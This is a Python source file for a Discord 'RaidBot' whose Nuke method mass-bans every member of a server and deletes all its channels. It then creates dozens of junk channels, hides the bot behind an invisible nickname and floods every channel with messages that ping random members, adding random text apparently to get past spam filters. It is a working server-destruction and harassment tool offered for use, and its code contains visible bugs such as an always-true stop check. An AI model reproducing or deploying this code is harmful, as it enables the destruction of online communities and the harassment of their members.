import asyncio
import random
import string
import typing

from discord import Member, TextChannel, VoiceChannel, Guild
from discord.abc import GuildChannel
from .Bot import Bot
from ..utils.Logger import Logger

class RaidBot(Bot):
    def __init__(self, logger:Logger, token:str, readyFunc:typing.Callable, readyFuncArgs:tuple):
        super().__init__(token)
        self.logger:Logger = logger
        self._channels:list[GuildChannel] = []

        self._readyFunc = readyFunc
        self._readyFuncArgs = readyFuncArgs

        self._stop = False
    def stop(self):
        self._stop = True
    async def _banUser(self, user:Member):
        msg = f"{user.name},{user.id}"
        self.logger.success(msg) if await  self.banUser(user) else self.logger.failed(msg)
    async def _deleteChannel(self, channel:GuildChannel):
        msg = f"{channel.name},{channel.id}"
        self.logger.success(msg) if await  self.deleteChannel(channel) else self.logger.failed(msg)
    async def _sendMessage(self, message:str, channel:GuildChannel):
        msg = f"{channel.name},{channel.id}"
        if not type(channel) in [TextChannel, VoiceChannel]:
            self._channels.remove(channel)
        self.logger.success(msg) if await self.sendMessage(message, channel) else self.logger.failed(msg)
    async def _createChannel(self, channelName:str, guild:Guild):
        channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
        msg = channelName
        self.logger.success(msg) if self.createChannel(channelName, guild) else self.logger.failed(msg)
    async def _banUsers(self, guild:Guild):
        self.logger.other("Start AllUserBan")
        await asyncio.gather(*(self._banUser(member) for member in guild.members))
        self.logger.other("End")
    async def _deleteChannels(self, guild:Guild):
        self.logger.other("Start DeleteAllChannel")
        await asyncio.gather(*(self._deleteChannel(channel) for channel in guild.channels))
        self.logger.other("End")
    async def _createChannels(self, channelName:str, guild:Guild, stop:int):
        self.logger.other("Start CreateChannels")
        await asyncio.gather(*(self._createChannel(channelName, guild) for _ in range(stop)))
        self.logger.other("End")
    async def Nuke(self, guildId:int, channelName:str, latency:int, messages:list[str], allUserBan:bool, allChannelDelete:bool, numberOfExecutions:int=50):
        guild = self.get_guild(guildId)
        if not guild:
            self.logger.failed("Guild not joined")
            await self.close()
            return
        i = guild.get_member(self.user.id)
        await i.edit(nick="឵᠎")
        if allUserBan:
            await self._banUsers(guild)
        if allChannelDelete:
            await self._deleteChannels(guild)
            await self._createChannels(channelName, guild, 60)
        self.logger.other("Start Nuke")
        try:
            self._channels = list(guild.channels)
            random.shuffle(self._channels)
            for _ in range(numberOfExecutions):
                if self.stop:
                    await self.close()
                    return
                random.shuffle(messages)
                for message in messages:
                    bMessage = message
                    if message == messages[0]:
                        bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
                    bMessage = bMessage.replace("!userId!", str(random.choice(guild.members).id))
                    await asyncio.gather(*(self.sendMessage(bMessage, channel) for channel in self._channels))
                await asyncio.sleep(latency*0.001)
        finally:
            pass
        self.logger.other("End")
        await self.close()
    async def on_ready(self):
        self.logger.other(f"Ready ID:{self.user.id}, Name:{self.user.name}\n\n")
        self._readyFunc(*((self,)+self._readyFuncArgs))